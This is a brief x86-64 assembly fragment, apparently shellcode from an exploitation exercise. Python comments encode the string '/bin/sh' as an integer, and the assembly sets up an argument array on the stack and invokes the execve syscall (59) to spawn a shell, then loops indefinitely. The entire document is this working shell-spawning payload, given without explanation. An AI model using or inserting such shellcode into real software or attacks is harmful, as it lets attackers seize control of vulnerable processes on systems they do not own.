
# >>> import struct
# >>> struct.unpack('<Q', '/bin/sh\x00')
# (29400045130965551,)

sub $0x92, %al
mov %rax, %rdi

xor %rdx, %rdx
sub $0x8, %al
mov %rdx, (%rax)

sub $0x8, %al
mov %rdi, (%rax)
mov %rax, %rsi
xor %rax, %rax
mov $59, %al
syscall
inf:
jmp inf
